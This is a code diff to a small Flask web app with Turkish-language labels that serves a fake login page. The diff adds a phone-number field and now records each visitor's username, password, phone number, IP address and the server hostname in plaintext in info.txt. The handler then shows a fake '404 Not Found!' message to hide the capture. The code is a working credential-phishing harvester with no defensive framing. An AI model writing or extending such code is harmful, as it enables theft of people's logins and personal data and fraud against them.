@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string
+import socket
 
 app = Flask(__name__)
 
@@ -25,7 +26,7 @@ HOME_PAGE = '''
                 box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                 text-align: center;
             }
-            input[type="text"], input[type="password"] {
+            input[type="text"], input[type="password"], input[type="tel"] {
                 width: 100%;
                 padding: 10px;
                 margin: 10px 0;
@@ -53,6 +54,7 @@ HOME_PAGE = '''
             <form action="/login" method="POST">
                 <input type="text" name="username" placeholder="Kullanıcı Adı" required>
                 <input type="password" name="password" placeholder="Şifre" required>
+                <input type="tel" name="phone" placeholder="Telefon Numarası" required>
                 <button type="submit">Giriş Yap</button>
             </form>
         </div>
@@ -68,9 +70,11 @@ def home():
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
-    # Kullanıcı giriş bilgilerini dosyaya kaydeder
+    phone = request.form.get('phone')
+    ip_address = request.remote_addr
+    hostname = socket.gethostname()
     with open('info.txt', 'a') as file:
-        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
+        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}, Telefon: {phone}, IP: {ip_address}, Hostname: {hostname}\n')
     return '404 Not Found!'
 
 if __name__ == '__main__':
